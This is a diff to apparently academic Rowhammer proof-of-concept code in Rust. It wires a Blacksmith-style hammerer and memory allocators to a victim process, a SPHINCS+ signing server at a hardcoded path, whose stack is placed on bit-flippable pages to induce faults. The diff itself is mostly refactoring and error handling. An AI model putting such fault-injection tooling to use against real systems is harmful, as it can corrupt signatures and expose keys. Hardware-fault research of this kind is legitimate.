@@ -5,12 +5,13 @@ use bs_poc::{
     allocator::{util::mmap, ConsecAllocator, Pfn, Spoiler},
     hammerer::blacksmith::blacksmith_config::BlacksmithConfig,
     memory::{
-        mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, MemBlock, PfnResolver,
+        find_flippy_page, mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, MemBlock,
+        PfnResolver,
     },
     util::{KB, MB},
     victim::{
-        stack_process::{find_flippy_page, InjectionConfig},
-        HammerVictim, HammerVictimError, StackProcess,
+        stack_process::{InjectionConfig, StackProcess},
+        HammerVictim, HammerVictimError,
     },
 };
 use clap::{arg, Parser};
@@ -77,7 +78,7 @@ fn main() -> anyhow::Result<()> {
                         spoiler.alloc_consec_blocks(4 * MB)?
                     }
                     AllocStrategy::Pfn => {
-                        let mut pfn = Pfn::new();
+                        let mut pfn = Pfn::new(mem_config);
                         pfn.alloc_consec_blocks(4 * MB)?
                     }
                     AllocStrategy::Mmap => {
@@ -97,7 +98,9 @@ fn main() -> anyhow::Result<()> {
                 info!("PFN: {:?}", flippy_page.pfn());
                 info!("Launching victim");
                 let mut victim = match StackProcess::new(
-                    &args.target,
+                    "/home/jb/sphincsplus/ref/test/server".to_string(),
+                    "keys.txt".to_string(),
+                    "sigs.txt".to_string(),
                     InjectionConfig {
                         flippy_page,
                         flippy_page_size: PAGE_SIZE,
@@ -115,8 +118,8 @@ fn main() -> anyhow::Result<()> {
                 victim.init();
                 let output = match victim.check() {
                     Ok(output) => output,
-                    Err(HammerVictimError::NoFlips) => "No flips".to_string(),
-                    Err(HammerVictimError::IoError(e)) => e.to_string(),
+                    Err(HammerVictimError::NoFlips) => todo!("No flips detected"),
+                    Err(HammerVictimError::IoError(e)) => todo!("IO error: {:?}", e),
                 };
                 //if output.contains(&format!("{:x}", target_pfn)) {
                 //    bail!("YES MAN: {},{}", bait_before, bait_after);
@@ -128,7 +131,7 @@ fn main() -> anyhow::Result<()> {
                     warn!("Flippy page not reused");
                 }
                 println!("{:?}", flippy_page);
-                info!("Child output:\n{}", output);
+                info!("Hammering result:\n{:?}", output);
                 victim.stop();
                 x.dealloc();
             }
